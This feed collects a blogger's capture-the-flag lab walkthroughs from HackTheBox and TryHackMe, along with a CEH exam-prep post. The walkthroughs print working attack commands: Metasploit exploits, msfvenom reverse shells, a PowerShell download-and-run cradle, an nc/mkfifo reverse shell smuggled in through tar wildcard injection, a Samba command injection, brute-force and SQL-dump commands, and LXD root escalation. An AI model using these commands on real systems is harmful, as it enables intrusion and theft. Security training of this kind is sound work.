Blue is yet another easy-level machine on HackTheBox. It is a Windows box (as will be seen from our NMAP scan later) and also has a very dangerous vulnerability called eternal-blue. If you've not listened to the "WannaCry" episode on Darknet Diaries Podcast, please do check it.

Let's begin by running nmap scan against the target box.

As can be seen from the scan, the machine is running Windoes 7 Professional which was prone to the eternal-blue vulnerability. But let's confirm that using Metasploit.

The host is likely vulnerable to eternal-blue. Let's try to exploit this.

Note: The below exploit may not work on the first attempt. For me it worked in the first attempt once and in second later.

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
exploit

item.title: How I passed my CEHv10
item.dc:creator: saikiranchalla
item.content:encoded:
Introduction

Certified Ethical Hacker (CEH) is a certification offered by EC-Council and has been in existance for a long time now (exam code: 312-50). CEH is divided into two parts:

  1. CEH Multiple Choice exam
  2. CEH Practical

As per ECC "A Certified Ethical Hacker is a skilled professional who understands and knows how to look for weaknesses and vulnerabilities in target systems and uses the same knowledge and tools as a malicious hacker, but in a lawful and legitimate manner to assess the security posture of a target system(s). The Certified Ethical Hacker credential certifies individuals in the specific network security discipline of Ethical Hacking from a vendor-neutral perspective."

If you pass both the above exams, you're called CEH Master. CEHv11 is set to release early next year.

I passed my CEH in October, 2020 with a score of 92%. In this blog I'd like to my preparation for CEH (multiple choice).

Background

DevOps Engineer with over 8 years of experience in developing software and operations. I'm very much interested in Offensive Security and started preparing for CEH as an introduction.

EC-Council Training

I attended a 5-day bootcamp style CEH training offered by ECC. It was taught by Michael Angelo Vien. Best part of the training was that the instructor did not focus on the exam only but also provided his real-life experiences with penetration testing. He clearly has a lot of experience in the field of security. One of his security start-ups was acquired by Symantec.

Is the training important for the exam? I'd say No. If you are a complete newbie to security, like me, then that's where I'd start. But if you've been working in security for quite sometime, then the training might sound a little moot.

What other training options does ECC have? ECC offers a complete online, self-paced training. I didn't like it much. The instructor was not fully involved in delivery. So I requested ECC to put me in a live online classroom instead.

The training also comes with access to iLabs, the online lab platform for ECC. From what I gathered from Reddit (r/CEH), it looks like iLabs is really important for the practical part of CEH.

Other Resources

CEH All-in-one by Matt Walker is a must read for the exam. It covers all of the ECC material in-depth and points important exam questions. I read this book cover-to-cover. This also comes with 2 practice tests which simulate the original exam and are very useful. If you are reading this book do checkout Scotty McCraig's Github that covers the important points in the book chapter-wise.

CyberQ practice questions have questions for every module as per the ECC official CEH material. If you are short on money and time, you can skip this resource. Like CEH AIO above, this also comes with 2 practice tests and some of the questions did overlap in the exam (at least for me).

Boson's Ethical Hacking practice exams are really good for the preparation. They cover a lot of important concepts with a really good explaination. It comes with a question bank of 500 questions. I was scoring around 80% on these tests.

ECC CEH Material is obviously a very important resource. It has 20 modules. Some of the modules are really small like IoT, Social Engineering, DoS etc. You have to read the whole material to be confident on the test.

Cheat Sheet

nmap Flags

-O = OS detection

-p = port range

-n = don't resolve

-F = fast mode

-f = fragmentation

-D = Decoy

-oN = Normal Output

-oX = XML output

-T0 = Serial, slowest scan

-T1 = serial, slowest scan

-T2 = Serial, normal speed scan

-T4 = Parallel, fast scan

-6 = IPv6 devices

Host discovery:

-PS/-PA/-PU = SYN, ACK, UDP

-PE = ICMP Echo scan

-Po = no ping

-PT = TCP scan

Scan options:

-sS = SYN scan (half-open scan)

-sn = check for active systems only

-sN = NULL

-sP = ping sweep

-sT = TCP scan (full TCP) SYN, SYN/ACK, ACK + RST

-sX = Xmas Scan

-sA = ACK scan

-sL = list scan

-sI = IDLE scan

-sO = protocol scan

-sR = RPC scan

-sW = window scan

ICMP responses

0: Echo reply

3: Destination unreachable

0: Destination n/w unreachable

1: destination host unreachable

3: UDP port is closed

6: n/w unknown

7: host unknown

9: n/w administratively prohibited

10: host administratively prohibited

13: communication administratively prohibited

5: Redirect

0: redirect datagram for the network

1: redirect datagram for the host

8: Echo request

11: time exceeded

Important Port numbers

HPing Flags

-1 = ICMP scan

-2 = UDP scan

-S = SYN

-A = ACK

-F = FIN

-U = URG

-R = RST

-P = PSH

-Q = Collect all TCP sequence numbers

--tcp-timestamp = guess the TCP timestamp and uptime of the host

-X = XMAS scan

nmap Responses

Ping Sweep

live host = Echo reply

dead host = No response

Full TCP connect:

Open port = SYN + ACK

Closed port = RST

Stealth/Half-TCP scan

open port = SYN + ACK

Closed port = RST

Inverse TCP

Closed port = RST/ACK

Open port = No response

XMAS Scan

Closed port = RST

open port = no response

ACK Scan

No firewall = RST

Stateful firewall = No response

IDLE/IPID scan

IPID + 1 = port closed

IPID + 2 = port open

IPID >= 3 = Zombie is busy

UDP scan

Closed port = ICMP port unreachable message

Open port = no response

Wireless Standards

Tips

  1. Read the question very carefully. Unfortunately, the questions are very badly worded.
  2. Know the most common port numbers. The ones above are sufficient. Questions involving the port numbers show an nmap output and ask you to identify what the user is scanning.
  3. Practice as many exams as possible. This will make you comfortable on the test day.
  4. Focus more on the sections that cover more weightare as per the ECC CEH blueprint.
  5. Checkout Google hacking database filters. There are always questions on this.
  6. Don't forget Snort rules format.

item.title: TryHackMe - Steel Mountain
item.dc:creator: saikiranchalla
item.content:encoded:
Introduction

In this blog, I will walk through the process of rooting the TryHackMe box Steel Mountain. It is an advanced Windows box and is part of the "Offensive Pentesting" learning path. We have to get to the root in 2 different ways. First is by using Metasploit. And the second is without using Metasploit. I personally like not using Metasploit, although it is a great tool, because by not using Metasploit I get to experience a lot of other tools, which could be beneficial in exams like OSCP, for example.

P.S: I'm still new to penetration testing, so please excuse my mistakes.

Scanning

We will use the popular tool "nmap" for scanning the target box.

nmap -A -sC -p- -Pn -o steel_mountain <IP_ADDRESS>

Note: If you're new to nmap, here is a cheatsheet for it.

Once you run the above command, the output would be as below:

It is interesting to note that there are 2 Web servers on the box. One is running on port 80 and the other running on port 8080.

Let's check each of them. Navigate to http://<IP_ADDRESS> using Firefox. See the employee of the month? Save the image that you see and that'll help you answer the first question.

The second web server that is running on port 8080 is called Rejetto HTTP File Server. I have never heard of this. So I did a Google search. (I use DuckDuckGo, so our results may vary). Third link from Rapid7 shows that the server is vulnerable to remote code execution. Great! That's all we want. Let's continue to exploit it.

Before we jump to exploitation, let's check exploit-db. I've highlighted the exploits that we will work with.

The Metasploit Way

Let's exploit the box using Metasploit. Again, if you're new to this, like me, use the cheatsheet here. Launch Metasploit from terminal by using the command msfconsole. Easiest way to use the exploit from the screenshot above is to run the search command inside Metasploit.

In order to use the above exploit, run the command use 0 or use exploit/windows/http/rejetto_hfs_exec.

Like every other Metasploit module, this module needs some options to be configured. Check the required options using show options command.

To run this module, we need to configure RHOSTS and RPORT options. Set the options use the following commands:

> set option RHOSTS <IP_ADDRESS_OF_TARGET>
> set option RPORT 8080

Time to exploit. Run the exploit command to start a meterpreter session. Once the session starts, look for the user key on the Desktop.

Note: Do not forget to check the IP in the LHOST option. It should be same as the tun0 if you are using your own Kali Linux machine.

At this point, we have finished the "initial access" part of the box. Let's continue to privilege escalation.

TryHackMe suggests using the PowerShell script located here to enumerate the machine further. To send this script to the target machine use meterpreter's upload command, as shown below.

Now that the script is on the machine, load the Powershell extension in meterpreter using the command load powershell.

Once the extension is loaded, power up the Powershell shell using the command powershell_shell.

We're ready to run the PowerUp.ps1 script now. Execute the script using the command . .\PowerUp1.ps1 and then run the Invoke-AllChecks command. Wait for the enumeration to complete.

The output lists all the services currently running on the target machine. Out of all the services listed, we're interested in that one service which we can restart (CanRestart set to true) and also has a modifiable file (ModifiableFile option). One service stands out from the list.

Note: I'm not naming the service here since it'll answer one of the questions.

We will replace this service with an .exe generated using msfvenom in order to make the target start a reverse shell to out attack machine.

Use the following command to generate a .exe using msfvenom. Note that the -f flag is set to exe-service.

msfvenom -p windoes/shell_reverse_tcp LHOST=<ATTACK_BOX_IP> LPORT=4545 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe

Once we have the .exe created, we need to send it to the target machine. Let's use the upload command in meterpreter again.

Note: Use Ctrl+C or exit in order to come out of the Powershell shell.

Before replacing the original .exe, make sure you stop the service using the command sc stop <SERVICE_NAME>. Wait for the service to stop and check for its status using the command sc query <SERVICE_NAME>.

Now execute the shell command, followed by the copy command to overwrite the original .exe of the service with the one we generated.

It is time to start the service with the new executable. But, before we do that, let's start a NetCat listener on the attack box so that the target can connect to it. Use the command nc -lvnp 4545 to start the listener.

Start the service using the command sc start <SERVICE_NAME>. Once started, the target will connect to the attack machine using reverse TCP shell.

Now that we have established a reverse shell, navigate to the Administrator's Desktop to get the root user's key.

Conclusion

The non-metasploit way didn't work for me the second time to capture screenshots. I will try it again and update this post.

Do not forget to join the THM Discord server here.

item.title: TryHackMe - Alfred
item.dc:creator: saikiranchalla
item.content:encoded:
Alfred exploits common misconfiguration in Jenkins is a well-known and widely used automation tool. Nishang is a set of scripts that can be used for enumeration and privilege escalation in Windows. We will use the same tool to gain initial access.

As with any other box, let's start with an NMAP scan.

nmap -oA alfred -sC -A -Pn <IP_ADDRESS>

Let's start by enumerating the Web servers. Visiting IIS on port 80 shows nothing interesting except Mr. Bruce Wayne's picture.

Continuing to the second web server running on port 8080 reveals the Jenkins login page.

The default Jenkins user name is admin. I tried the default credentials of admin:admin and I was able to login to Jenkins. Moving further, the core of Jenkins is the ability to run builds. Let's start by re-configuring an existing build to run the following command to establish a reverse shell.

powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

To re-configure the job, click on "project" and then on "configure" on the left of the job page.

Scroll down to the "Build" section and replace the existing command "whoami" with the one above and save the job.

Before you trigger the build, prepare your attack machine by downloading or cloning Nishang and starting a web server.

wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
python -m http.server 80

Now we have everything in place. Let's trigger the job by clicking on "Build Job". If everything is configured correctly, you should get a shell.

To get the user key, cd .. to the Desktop of the user bruce.

Moving to the next part. Use the following command to get a windows meterpreter reverse shell.

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=4545 -f exe -o shell-rev.exe

Reconfigure the previous Jenkins job to download the newly generated reverse shell executable. Update the job to run the following command.

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.6.23/shell-name.exe','shell-rev.exe')"

Note: Make sure that the HTTP server is still running (on port 80, if you're following this).

Before triggering the job, make sure that you've started Metasploit and configured the reverse TCP shell handler using the command below.

msfconsole
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-ip 
set LPORT 4545
run

I did not have any success using the newly generated .exe. So I used the same command in the build configuration that we used to get initial access.

powershell iex (New-Object Net.WebClient).DownloadString('http://10.13.6.23/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.13.6.23 -Port 4545

I couldn't do much with the meterpreter session that was created, so I decided to switch back to the original NetCat approach. Start a NetCat session using the command nc -lp 1234 and re-trigger the job.

Once we get the reverse shell, we can run the custom .exe that was generated using msfvenom to create a meterpreter session.

Moving on to privilege escalation. First let's determine the current user's privileges using the command whoami /priv.

As you can see, the current user has 2 privileges enabled from the list here that can be exploited.

  • SeDebugPrivilege
  • SeImpersonatePrivilege

Load the incognito Metasploit module using the command load incognito or use incognito.

Get the tokens that are currently available, using the command list_tokens -g.

Bingo! From the list, we can see that the BUILDIN\Administrator's token is available. We can impersonate the administrator using the command impersonate_token "BUILTIN\Administrators".

At this point, I recommend reading the text that is present in TryHackMe to understand how Windows handles permissions. Let's use the ps command to get the PID for the services.exe process. For me it was 668.

We can migrate to this process using the migrate <PID> command.

That's it. We can now shell into the target machine and get the root key from the path C:\Windows\System32\config.

item.title: TryHackMe - HackPark
item.dc:creator: saikiranchalla
item.content:encoded:
HackPark is part of the "Offensive Pentesting" learning path in TryHackMe. Let's begin by an NMAP scan on the machine.

nmap -A -sC -Pn -oA hack_park <IP_ADDRESS>

There is a web server running on port 80. Visiting the page shows "pennywise".

Browsing through the website revealed a login page.

My first intuition was to login with the username "admin" and password "admin", which failed :). And a Google search on "BlogEngine.net" default credentials also revealed the same. So we know the username could be "admin". I tried a bunch of other combinations and they failed too. So I fired up Hydra to perform brute forcing on the login page.

Note: Before you trigger Hydra, get the __VIEWSTATE from Burp Suite as shown below.

Replace the user name "admin" and password "admin" with "^USER^" and "^PASS^" (without the quotes). The page shows the message "Login Failed" when we enter wrong credentials. With this information, the Hydra command will be:

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.118.209 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=RrVmD9gjbSFC76gkS0r%2FKUMX3dNXJmL%2Bnl7xEf6GorStCr5aIJiTFMfIHanBL1huOLtTG0RGNQerYRqhYt9Aq08L5ClmXG7CHXonH7a%2Bwx1PsZd7yfkz2ULO1EgHqTVSkReWuF%2FwTkLIXE%2FB1BFlhXbwESVLwLAlvmyYRCmvnwFZcuWP&__EVENTVALIDATION=gGHc7YCnTR%2B8XlFmr8X1xDqIEXRjZ7CSjm7%2Fy4UmhqoODHsA3LhAhvN4V8A9gkJVp2anjXzEqupRUrom%2Fgksv98f4Ze5bdIVIjLrgvcoWndOoFyHVNYuI%2BDMA%2FtBqY4fpbXe2LktRTt%2BhyNl4cx4ByKDmXPZ%2BHN%2Bxr9K%2BlWJ%2BquDDndw&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv

And we get our password in less than 5 minutes.

Logging in with the credentials of "admin".

Searching the Exploit-DB reveals a Remote Code Execution vulnerability in the version of BlogNet.

Download the exploit using the command:






Once downloaded, rename the file to "PostView.ascx" and modify it to update your attack machine's IP address.









Start a NetCat listener on port 4445 (or any other port and update the exploit code accordingly).





nc -lvp 4445





Navigate to the "Content" section of the blog and select a blog post to edit. In the "edit" view we will upload the exploit using the file browser option.









As can be seen from the upload dialog, the file is uploaded to ~/App_Data/files.









Save the post and navigate to the URL: http://<IP_ADDRESS>/?theme=../../App_Data/files. This should get you a reverse shell.









Moving to the next part to use Metasploit. First generate a reverse TCP meterpreter payload using msfvenom.





msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -f exe -o shell.exe









Start a Web Server using Python to serve the newly generated payload





python3 -m http.server





In the NetCat reverse shell, use the following command to download the payload to the target machine.





Note: It is preferable to download the payload to a global writable folder like Temp.





powershell -c "Invoke-WebRequest -Uri 'http://<IP_ADDRESS>:<PORT>/shell.exe' -Outfile 'C:\Windows\Temp\shell.exe'"





When the command is run, we should see a hit on our web server. Before running the file on the remote host, we need to start a Metasploit session to catch the meterpreter reverse TCP shell.





msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4545









Invoke the reverse shell payload on the target machine.





.\shell.exe









Running the command sysinfo will provide more information regarding the target machine.









Download Winpeas on the target machine to search for vulnerabilities.





Note: We will download Winpeas on to the target machine same as the way we downloaded the meterpreter payload.





wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat













Execute the winPeas.bat on the target machine.





.\winPeas.bat





Looks like there are some scheduled tasks running. Let's navigate to the SystemScheduler folder and enumerate further.





cd C:\Program Files (x86)\SystemScheduler





A quick "ls" on the files shows that we have read and write permissions here. Let's identify the executable that is invoked by the scheduler by looking into the Events folder for logs.









cd Events\





Reading the INI_LOG.txt file, we can see that the executable with name Message.exe is invoked every 30 seconds and is also running as root. 





Let's replace the "Message.exe" with the meterpreter payload file we created earlier (shell.exe).





copy C:\Windows\Temp\shell.exe "C:\Program Files (x86)\SystemScheduler\Message.exe"









Note: The above command didn't do the magic. So I had to exit out of the shell and use meterpreter "mv" command to replace the Message.exe.









And we're administrator.









We can get the root key using the more command.









And the user key.









Note: There was something wrong with the way I was running WinPeas so the output was a little corrupted.





For the non-metasploit way, generate a new payload using the command below.





msfvenom -p windows/shell_reverse_tcp LHOST=10.13.6.23 LPORT=4444 -o shell.exe -f exe





Upload the newly generated payload using the NetCat session that we established a the very beginning (if you have closed it, reload the webpage here to re-initiate the session).





powershell -c "Invoke-WebRequest -Uri http://10.13.6.23:8000/shell.exe -OutFile shell-2.exe"
.shell-2.exe





This should result in a new reverse shell connection.

item.title: HTB - Lame Write-Up
item.dc:creator: saikiranchalla
item.content:encoded:
Lame is an easy beginner machine available on HTB. It is retired, so you'll need an HTB subscription to access the machine.

Let's begin by running nmap on the target box.

nmap -p- -Pn 10.10.10.3 -oA lame

Note: One cool thing I learned from one of the videos of TheCyberMentor is to run nmap without the -A switch first and then run it with -P <open ports list> -A. This saves a lot of time.

nmap -p 22,22,139,445,3632 -Pn 10.10.10.3 -oA lame -A

FTP

Port 21 seems to be using VSFTPD which suffered from a backdoor command execution vulnerability after its binary was replaced with a malicious one. Let's check if the target is running that specific version using searchsploit.

searchsploit vsftpd 2.3.4

As we can see from the output of searchsploit, target machine is vulnerable to the backdoor command execution vulnerability. Let's exploit this by using Metasploit.

msfconsole
search vsftpd 2.3.4

Unfortunately, I couldn't get the exploit to run in Metasploit.

Samba

Next target is the Samba server. Let's try to list the directories using the following command:

smbclient -L \\\\10.10.10.3\\

This gave me an error as show in the screenshot below.

So I updated the command to set the minimum protocol version, as below:

smbclient -L \\\\10.10.10.3\\ --option="client min protocol=nt1"

I tried connecting to the ADMIN$ share, but it didn't allow me to do much.

So, I tried to connect to the tmp share and I was able to login with anonymous access.

Let's use the logon command to login to smb. Before we do that, let's start a NetCat listener on port 4545.

logon "./`nphup nc -e /bin/sh <ATTACK_BOX_IP> 4545`"

And we're root! Let's get the user key and the root key using the following commands.

cat /home/makis/user.txt
cat /root/root.txt

Metasploit way

This is the easiest way to root the box.

Searchsploit displayed the following results for the Samba version running on the target box.

Out of these the second result is a Metasploit module. Let's launch Metasploit and try running the module.

As you can see, we successfully rooted the machine. From here we can get our root flag by using the following command:

cat /root/root.txt

Lessons Learned

  • CVE 2007-2447 - Samba "username map script" exploit
  • VSFTPD exploit (although it didn't work here)

item.title: HTB - Tabby Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Tabby is yet another easy-level box on HackTheBox. It is a Linux box with the IP address 10.10.10.194.

Let's start by running an NMAP scan against the target machine.

nmap -Pn -p- -A -oA 10.10.10.194

It has two web servers running. One on port 80 and another on port 8080. I want to start by looking to the second web server since its running Apache Tomcat, and there are always configuration errors with it.

Navigating to http://10.10.10.194:8080 displays a default page.

Now, let's check the other web server that is running on port 80. It seems to be hosting a website.

I clicked on all of the pages in the header of the website. When I clicked on "NEWS" it resulted in an error page.

Something is wrong with this page. I added "megahosting.htb" to my /etc/hosts file and reloaded the webpage. It resulted in the following.

Looking at the URL, it is clear that this page has Local File Inclusion (LFI) vulnerability in it. Let's replace "file=statement" with "file=../../../../etc/passwd" to confirm LFI.

And we hit a gold mine. Let's exploit this vulnerability to get the tomcat-users.xml which has the user credentials for the admin or manager-gui. Where do we find it? Looking at the default page of Apache Tomcat above, we can see a line that reads: This is the default Tomcat home page. It can be found on the local filesystem at: /var/lib/tomcat9/webapps/ROOT/index.html.

So our file should be somewhere in the directory /var/lib/tomcat9. This post helped me a bit to find the file. Here are the possible locations:

  • /var/lib/tomcat9/conf/tomcat-users.xml
  • /var/lib/tomcat9/tomcat-users.xml
  • /etc/tomcat9/tomcat-users.xml
  • /usr/share/tomcat9/tomcat-users.xml
  • /usr/share/tomcat9/conf/tomcat-users.xml

I finally found it at the location "/usr/share/tomcat9/etc/tomcat-users.xml". Launching this request in BurpSuite Repeater, I got the manager-gui, username and password.

Now that we can login to Tomcat Manager GUI, we can also deploy a malicious WAR (Web Archive) file that would initiate a reverse shell to our attack box. To generate the WAR we will use msfvenom as below:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACK_IP LPORT=PORT -f war > shell.war

To deploy the WAR on the Apache Tomcat server we will use the following curl command. Here is some insight into the process.

curl -T shell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/shell&update=true"

Before navigating to the path at "/shell" make sure to launch netcat listener on port 4545 on the attack box.

We got our initial access as the "tomcat" user. But that's not what we are looking for. A quick "ls" on the "/home" directory shows another user with the name ash, who is password protected.

Let's enumerate the machine further using linpeas.

wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh

python3 -m http.server

Download linpeas on the target's "/tmp" folder and run it.

Linpeas showed two interesting things. The user "ash" owns a backup file. And secondly, the user is part of a "lxd" group. We will use. thelater for privilege escalation.

The backup zip file is password protected. So download the file to your attack box to crack it using "fcrackzip". Run the following on the attack box to dowload the file:

curl http://10.10.10.194/news.php?file=../../../../../var/www/html/files/16162020_backup.zip > backup.zip

Once dowloaded, crack the password using "fcrackzip".

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip

Using the same password of the zip file, we can login as user "ash".

Privilege escalation can be achieved by following the article here. It uses the "lxd" vulnerability that our user "ash" is added to mount the root file system.

Note: Running the command "lxd image import ..." may result in an error that the file is not found. Try to run the command from a different directory. I ran it from the users home directory and it worked.

On the attack machine run the following commands.

git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine

Once the build completes, start a HTTP server using "python3 -m http.server" to download the exploit on the target machine.

On the target machine run the following commands:

cd /home/ash
mkdir exploit
cd exploit
wget http://10.10.14.31:8000/alpine-v3.12-x86_64-20201031_0306.tar.gz

Once downloaded, continue to run the following commands:

lxc image import ./alpine-v3.12-x86_64-20201031_0306.tar.gz --alias myimage
lxc image list

Before moving to the privilege escalation part, run the following commands to initialize lxd and create a datastore (use the defaults).

lxd init

To escalate the privileges, run the following commands:

lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

Now to escalate privileges, use the following commands from the article:

lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

We're root! Key is located at "/mnt/root/root.txt".

Lessons learned

  • Local File Inclusion
  • Apache Tomcat Directory structure
  • LXD in Linux

item.title: TryHackMe - Game Zone Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Game Zone is TryHackMe box in the "Offensive Pentesting" learning path. Let's begin by scanning the box with Nmap.

nmap -p- <IP>

Looks like port 22 and 80 are open. Let's scan these ports further to get more information.

Navigating to http://<IP> in browser revealed the following web page.

I'm not much of a gamer and I didn't know who the character was holding the sniper. So, I downloaded the image and searched it on Google Image Search. It revealed the name to be "Agent 47".

Whenever I see a login form, the first thing I try is to see if the page has SQLi vulnerability. Testing the form with username as  ' or 1=1 -- - reveals that the page is vulnerable to SQLi and redirects us to "portal.php".

Let's use SQLMap to dump the entire database, now that the page is vulnerable to SQLi.

First, capture a sample request in BurpSuite and searching for something on the Portal page.

  • Launch BurpSuite
  • Update Firefox proxy settings
  • Search for something
  • Traffic is intercepted (by default "Intercept" option is on).
  • Navigate to the HTTP history tab under Proxy

Save the request in a text file (call it request.txt, for example). Launch SQLMap using the following command:

sqlmap -r request.txt --dbms=mysql --dump

SQLMap tests the webpage for different types of SQLi like blind, boolean etc.

SQLMap dumped the "post" table and a hashed password.

Let's try to crack the password using JohnTheRipper. SQLMap dumped the password in a tempory file.

Use this password to SSH into the box.

Now that we've SSH access to the machine, we can setup an SSH tunnel. Syntax for the command is:

ssh -L local_port:remote_address:remote_port username@server.com

Before we start the tunnel, let's determine the running services on the target box using the ss command:

ss -tulpn

As can be seen from the output above, there is a TCP service running on port 10000. We will use this port in our tunneling, as below:

ssh -L 10000:localhost:10000 agent47@<ip>

Once the tunneling is established, open browser and navigate to http://<IP>:10000.

I was able to login to Webmin using the credentials of "agent47".

The server is running Webmin, which is a remote administration tool for Unix. Searching exploit-db using searchsploit reveals a RCE vulnerability.

More about this exploit can be found here. Appending "/file/show.cgi/etc/passwd", loads the file as a root. With this, let's get the root key.

Lessons Learned

  • SQLMap
  • John the ripper
  • SSH tunneling

item.title: TryHackMe - Skynet Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Skynet is a Terminator themed box on TryHackMe. It is rated as an easy box. Let's begin by scanning the box using nmap.

nmap -p- <IP>

Looks like the box is running a web server, IMap (for E-mails), and Samba. Let's run nmap again but with the "-A" switch.

Navigating to http://<IP> in Browser revealed a Google styled search engine.

Using Gobuster to search for directories:

gobuster dir --url http://<IP> --wordlist /usr/share/wordlists/rockyou/

Enumerating Samba to list shares using SMBMap revealed a read-only "anonymous" share.

smbmap -H <IP>

Using smbclient to connect to the share:

smbclient //<IP>/anonymous

The content of the files was as below:

The log1.txt file contains some passwords. I was wondering who "Miles" was, and the attention.txt has a message from "Miles Dyson".

Earlier, Gobuster scan revealed a SquirrelMail on the web server. Let's try to login with the credentials of "Miles" and see if we find anything interesting.

I used BurpSuite to try every password from the "log1.txt" file. Capture the request in BurpSuite and send it to intruder. Configure the intruder payload to use the list of passwords from before. Optionally, you can configure the "grep match" to contain the text "Unknown user or password incorrect".

Note: The username I used here is "milesdyson" as the SMBMap revealed a share by this name.

We got the password for "milesdyson". Let's login with these credentials and look for a password change E-mail, since the attention.txt file mentioned something about password change.

With the new credentials, let's login to "milesdyson's" SMB shre.

The contents of important.txt file above revealed a new CMS endpoint.

Visiting the newly discovered endpoint revealed Miles Dyson's personal page.

Let's use Gobuster again but this time on the newly found CMS endpoint.

Visiting the "administrator" endpoint revealed Cuppa CMS' administrator page.

Never heard of this! And a quick Google search revealed Remote File Inclusion vulnerability(here). As noted in the exploit, the following line is the reason for this vulnerability.

LINE 22: 
        <?php include($_REQUEST["urlConfig"]); ?>

To exploit this, we will follow the steps below:

  1. Start a netcat listener of a preferred port (nc -lvnp 4545).
  2. Download a PHP reverse shell from here.
  3. Udate the code to change IP and Port number.
  4. Start a local HTTP server to serve the shell (python3 -m http.server)
  5. Navigate to the URL: http://<IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<ATTACK_IP>:8000/php-reverse-shell.php?

And we should get a reverse shell!

But we're logged in as "www-data". Let's try to login with the credentials of "milesdyson" from before.

We can get the user's key from "/home/milesdyson/user.txt".

Let's enumerate the box further using "linpeas" for privilege escalation.

cd /tmp
wget http://<ATTACK_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

Note: If you've not downloaded linpeas on the attack box, download it from here.

Linpeas revealed a cron job that is run as a root user.

This Cron job is being executed every minute. Open a new netcat listener on a different port on the attack box and update the "backup.sh" to establish a connection to the attack box.

As can be seen from the above screenshot, the backup.sh script is using a wildcard "*". This article explains the vulnerability with using wildcards in Unix or Linux commands.

Run the following commands as "www-data" user (not milesdyson).

cd /var/www/html
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.6.23 4444 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
chmod +x shell.sh
cd ..

And that should give us a root shell in a minute.

There is yet another way for privilege escalation This uses a kernel exploit.

The exploit can be downloaded from exploit-db here. Run the following commands on the attack box.

wget https://www.exploit-db.com/raw/43418
gcc exploit.c -o exploit
python3 -m http.server

Once the exploit is compiled and ready, run the following on the target machine.

wget http://10.13.6.23:8000/exploit
chmod +x exploit
./exploit

And we should get the root!

Lessons Learned

  • Wildcard vulnerability in Unix commands
  • Ubuntu kernel vulnerability

item.title: TryHackMe - Daily Bugle Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Daily Bugle is a TryHackMe box that is part of the "Offensive Pentesting" learning path. It is rated as hard.

Let's begin by scanning the box with nmap.

The box is running Joomla CMS with MariaDB as database. Navigating to the web server running on port 80, revealed this.

Now that we know the box is running Joomla, let's enumerate this further using Joomscan.

joomscan -u http://<IP>

Searching exploit-db reveals that this version of Joomla is vulnerable to SQLi.

We can verify if the page is vulnerable by visiting the URL mentioned in the exploit. And as we can see it is vulnerable to SQLi.

Running the following command returns the tables in the DB of Joomla.

sqlmap -u "http://10.10.23.241/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

Note: The above command will take a lot of time to run. Be patient!

Let's enumerate more on the "joomla" table.

sqlmap -u "http://10.10.23.241/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla --tables

Before we dump the users table, let's verify if it has the fields we're looking for (password fields).

sqlmap -u "http://10.10.23.241/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla -T "#__users" --columns

And it does have the column "password". Let's proceed with dumping the table.

sqlmap -u "http://10.10.23.241/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla -T "#__users" --dump

Clearly, the password is encrypted. Let's use the tool John The Ripper to crack this password. A quick Google search reveals that the password was encrypted in bcrypt format. This is required to crack it.

john --format=bcrypt password.txt --wordlist=/usr/share/wordlists/rockyou.txt

I tried to SSH with the user "jonah" and the password from above, but it failed.

Let's use these credentials to login to Joomla Administration portal.

Once logged-in, click on Templates on the left and select any template. Replace any ".php" file with a malicious one to get reverse shell to the attack box.

We can use the reverse shell PHP script available here.

Update the downloaded script to replace the attack box's IP address.

After making the change, upload the script to replace the content of index.php file.

Start a netcat listener on port 1234.

nc -lvnp 1234

Once everything is in place, click on "Template Preview". This will start a reverse shell to the attack machine.

We got the shell as the user "apache". Let's enumerate the users by checking the "/home" folder.

That's a different user. Let's enumerate the box further using linpeas to look for any potential vulnerabilities. It flagged a file "configuration.php" that contains a password field.

And we do get the credentials.

